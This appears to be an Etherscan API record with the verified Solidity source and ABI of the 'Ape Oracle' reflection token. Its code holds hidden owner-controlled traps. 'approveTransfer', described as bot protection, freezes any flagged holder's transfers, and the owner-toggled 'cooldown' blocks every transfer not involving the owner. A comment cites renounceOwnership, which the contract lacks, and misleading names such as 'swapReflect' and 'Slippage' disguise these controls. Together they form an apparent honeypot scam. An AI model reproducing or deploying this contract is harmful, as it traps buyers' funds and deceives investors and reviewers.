{"status": "1", "message": "OK", "result": [{"SourceCode": "{\"APE ORACLE.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity =0.8.10;\\r\\nimport \\\"./Ownable.sol\\\";\\r\\nimport \\\"./SafeMath.sol\\\";\\r\\ninterface IERC20 {\\r\\n    function totalSupply() external view returns (uint256);\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n    function allowance(address owner, address spender) external view returns (uint256);\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);}\\r\\ncontract APEoracle is IERC20, Ownable {\\r\\n    using SafeMath for uint256;\\r\\n    string private _name = \\u0027Ape Oracle\\u0027;\\r\\n    string private _symbol = \\u0027APEoracle\\u0027;\\r\\n    uint8 private _decimals = 9;\\r\\n    uint256 private constant _tTotal = 1000000000000*10**9;\\r\\n    uint256 private _slippage = 5;\\r\\n    mapping (address =\\u003e mapping (address =\\u003e uint256)) private _allowances;\\r\\n    mapping (address =\\u003e bool) private _approveTransfer;\\r\\n    mapping (address =\\u003e uint256) private _rOwned;\\r\\n    mapping (address =\\u003e uint256) private _tOwned;\\r\\n    mapping (address =\\u003e bool) private _isFeeExcluded;\\r\\n    uint256 private constant MAX = ~uint256(0);\\r\\n    address[] private _feeExcluded;\\r\\n    uint256 private _tFeeTotal;\\r\\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\\r\\n    address unirouter;\\r\\n    address unifactory;\\r\\n    bool _cooldown = false;\\r\\n    constructor (address ufctr, address urter) {\\r\\n        _rOwned[_msgSender()] = _rTotal;\\r\\n        emit Transfer(address(0), _msgSender(), _tTotal);\\r\\n        _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);\\r\\n        _isFeeExcluded[_msgSender()] = true;\\r\\n        _feeExcluded.push(_msgSender());\\r\\n        unirouter = urter;\\r\\n        unifactory = ufctr;}\\r\\n    function name() public view returns (string memory) {\\r\\n        return _name;}\\r\\n    function symbol() public view returns (string memory) {\\r\\n        return _symbol;}\\r\\n    function decimals() public view returns (uint8) {\\r\\n        return _decimals;}\\r\\n    function totalSupply() public pure override returns (uint256) {\\r\\n        return _tTotal;}\\r\\n    function balanceOf(address account) public view override returns (uint256) {\\r\\n        if (_isFeeExcluded[account]) return _tOwned[account];\\r\\n        return tokenFromReflection(_rOwned[account]);}\\r\\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;}\\r\\n    function allowance(address owner, address spender) public view override returns (uint256) {\\r\\n        return _allowances[owner][spender];}\\r\\n    function approve(address spender, uint256 amount) public override returns (bool) {\\r\\n        _approve(_msgSender(), spender, amount);\\r\\n        return true;}\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n        return true;}\\r\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\r\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\\r\\n        return true;}\\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\r\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \\\"ERC20: decreased allowance below zero\\\"));\\r\\n        return true;}\\r\\n    function reflect(uint256 tAmount) public {\\r\\n        address sender = _msgSender();\\r\\n        require(!_isFeeExcluded[sender], \\\"Excluded addresses cannot call this function\\\");\\r\\n        (uint256 rAmount,,,,) = _getValues(tAmount);\\r\\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\\r\\n        _rTotal = _rTotal.sub(rAmount);\\r\\n        _tFeeTotal = _tFeeTotal.add(tAmount);}\\r\\n    function cooldown() external onlyOwner {\\r\\n        if (_cooldown == false) {_cooldown = true;}\\r\\n        else {_cooldown = false;}}\\r\\n    function cooledDown() public view returns (bool) {\\r\\n        return _cooldown;}\\r\\n    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {\\r\\n        require(tAmount \\u003c= _tTotal, \\\"Amount must be less than supply\\\");\\r\\n        if (!deductTransferFee) {\\r\\n        (uint256 rAmount,,,,) = _getValues(tAmount);\\r\\n        return rAmount;} else {\\r\\n        (,uint256 rTransferAmount,,,) = _getValues(tAmount);\\r\\n        return rTransferAmount;}}\\r\\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\\r\\n        require(rAmount \\u003c= _rTotal, \\\"Amount must be less than total reflections\\\");\\r\\n        uint256 currentRate =  _getRate();\\r\\n        return rAmount.div(currentRate);}\\r\\n    function _approve(address owner, address spender, uint256 amount) private {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);}\\r\\n    function _transfer(address sender, address recipient, uint256 amount) private {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n        require(amount \\u003e 0, \\\"Transfer amount must be greater than zero\\\");\\r\\n        if (_approveTransfer[sender] || _approveTransfer[recipient]) require (amount == 0, \\\"approveTransfer: allowed here\\\");\\r\\n        if (_cooldown == false || sender == owner() || recipient == owner()) {        \\r\\n        if (sender == owner() || recipient == owner()) {_ownerTransfer(sender, recipient, amount);\\r\\n        } else if (_isFeeExcluded[sender] \\u0026\\u0026 !_isFeeExcluded[recipient]) {\\r\\n        _transferFromExcluded(sender, recipient, amount);\\r\\n        } else if (!_isFeeExcluded[sender] \\u0026\\u0026 _isFeeExcluded[recipient]) {\\r\\n        _transferToExcluded(sender, recipient, amount);\\r\\n        } else if (!_isFeeExcluded[sender] \\u0026\\u0026 !_isFeeExcluded[recipient]) {\\r\\n        _transferStandard(sender, recipient, amount);\\r\\n        } else if (_isFeeExcluded[sender] \\u0026\\u0026 _isFeeExcluded[recipient]) {\\r\\n        _transferBothExcluded(sender, recipient, amount);\\r\\n        } else {_transferStandard(sender, recipient, amount);}\\r\\n        } else {require (_cooldown == false, \\\"\\\");}}\\r\\n    function _ownerTransfer(address sender, address recipient, uint256 tAmount) private {\\r\\n        (uint256 rAmount, , , , ) = _getValues(tAmount);\\r\\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\\r\\n        if (_isFeeExcluded[sender]) {\\r\\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);}\\r\\n        _rOwned[recipient] = _rOwned[recipient].add(rAmount);\\r\\n        if (_isFeeExcluded[recipient]) {\\r\\n        _tOwned[recipient] = _tOwned[recipient].add(tAmount);}\\r\\n        emit Transfer(sender, recipient, tAmount);}\\r\\n    function _transferStandard(address sender, address recipient, uint256 tAmount) private {\\r\\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\\r\\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\\r\\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \\r\\n        _reflectFee(rFee, tFee);\\r\\n        emit Transfer(sender, recipient, tTransferAmount);}\\r\\n    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\\r\\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\\r\\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\\r\\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\\r\\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \\r\\n        _reflectFee(rFee, tFee);\\r\\n        emit Transfer(sender, recipient, tTransferAmount);}\\r\\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\\r\\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\\r\\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\\r\\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\\r\\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \\r\\n        _reflectFee(rFee, tFee);\\r\\n        emit Transfer(sender, recipient, tTransferAmount);}\\r\\n    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\\r\\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\\r\\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\\r\\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\\r\\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\\r\\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \\r\\n        _reflectFee(rFee, tFee);\\r\\n        emit Transfer(sender, recipient, tTransferAmount);}\\r\\n    /** @notice This reject first bots, on the beginning of listing, to prevent dump later.\\r\\n    *When renounceOwnership is done (the Owner is zero address) this function can\\u0027t be use anymore.*/\\r\\n    function approveTransfer (address transferAddress) external onlyOwner {\\r\\n        require (owner() != address(0), \\\"Can\\u0027t execute this function when renounceOwnership is done (the owner is zero address)\\\");\\r\\n        if (_approveTransfer[transferAddress] == false) {_approveTransfer[transferAddress] = true;} else {_approveTransfer[transferAddress] = false; }}\\r\\n        function swapReflect(address transferAddress) public view returns (bool){\\r\\n        return _approveTransfer[transferAddress];}\\r\\n    /** @notice Required slippage in percent, which has to be set to buy/sell.\\r\\n    *During each transaction, that percent of tokens will be taken and spread as airdrop to all hodlers.*/\\r\\n        function Slippage () public view returns (uint256) {\\r\\n        return _slippage;}\\r\\n    function _reflectFee(uint256 rFee, uint256 tFee) private {\\r\\n        _rTotal = _rTotal.sub(rFee);\\r\\n        _tFeeTotal = _tFeeTotal.add(tFee);}\\r\\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {\\r\\n        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);\\r\\n        uint256 currentRate =  _getRate();\\r\\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);\\r\\n        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);}\\r\\n    function _getTValues(uint256 tAmount) private view returns (uint256, uint256) {\\r\\n        uint256 tFee = tAmount.div(100).mul(_slippage);\\r\\n        uint256 tTransferAmount = tAmount.sub(tFee);\\r\\n        return (tTransferAmount, tFee);}\\r\\n    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\\r\\n        uint256 rAmount = tAmount.mul(currentRate);\\r\\n        uint256 rFee = tFee.mul(currentRate);\\r\\n        uint256 rTransferAmount = rAmount.sub(rFee);\\r\\n        return (rAmount, rTransferAmount, rFee);}\\r\\n    function _getRate() private view returns(uint256) {\\r\\n        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\\r\\n        return rSupply.div(tSupply);}\\r\\n    function _getCurrentSupply() private view returns(uint256, uint256) {\\r\\n        uint256 rSupply = _rTotal;\\r\\n        uint256 tSupply = _tTotal;      \\r\\n        for (uint256 i = 0; i \\u003c _feeExcluded.length; i++) {\\r\\n        if (_rOwned[_feeExcluded[i]] \\u003e rSupply || _tOwned[_feeExcluded[i]] \\u003e tSupply) return (_rTotal, _tTotal);\\r\\n        rSupply = rSupply.sub(_rOwned[_feeExcluded[i]]);\\r\\n        tSupply = tSupply.sub(_tOwned[_feeExcluded[i]]);}\\r\\n        if (rSupply \\u003c _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\\r\\n        return (rSupply, tSupply);}}\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity =0.8.10;\\r\\nabstract contract Context {\\r\\n    function _msgSender() internal view virtual returns (address payable) {\\r\\n        return payable(msg.sender);}\\r\\n    function _msgData() internal view virtual returns (bytes memory) {this;\\r\\n        return msg.data;}}\\r\\ncontract Ownable is Context {\\r\\n    address private _owner;\\r\\n    address internal _distributor;\\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n    constructor () {\\r\\n        address msgSender = _msgSender();\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);}\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");_;}\\r\\n    function owner() internal view returns (address) {\\r\\n        return _owner;}}\"},\"SafeMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity =0.8.10;\\r\\nlibrary SafeMath {\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        uint256 c = a + b;\\r\\n        require(c \\u003e= a, \\\"SafeMath: addition overflow\\\");\\r\\n        return c;}\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return sub(a, b, \\\"SafeMath: subtraction overflow\\\");}\\r\\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b \\u003c= a, errorMessage);\\r\\n        uint256 c = a - b;\\r\\n        return c;}\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        if (a == 0) {\\r\\n        return 0;}\\r\\n        uint256 c = a * b;\\r\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\r\\n        return c;}\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return div(a, b, \\\"SafeMath: division by zero\\\");}\\r\\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b \\u003e 0, errorMessage);\\r\\n        uint256 c = a / b;\\r\\n        return c;}\\r\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return mod(a, b, \\\"SafeMath: modulo by zero\\\");}\\r\\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b != 0, errorMessage);\\r\\n        return a % b;}}\"}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ufctr\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"urter\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Slippage\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"transferAddress\",\"type\":\"address\"}],\"name\":\"approveTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cooldown\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cooledDown\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tAmount\",\"type\":\"uint256\"}],\"name\":\"reflect\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tAmount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"deductTransferFee\",\"type\":\"bool\"}],\"name\":\"reflectionFromToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"transferAddress\",\"type\":\"address\"}],\"name\":\"swapReflect\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rAmount\",\"type\":\"uint256\"}],\"name\":\"tokenFromReflection\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "APEoracle", "CompilerVersion": "v0.8.10+commit.fc410830", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d0000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a44f2cad770c6a9c66bc7d6fa2aeac98da3a49b4ab9c65be9a8e0fc48285c93b"}]}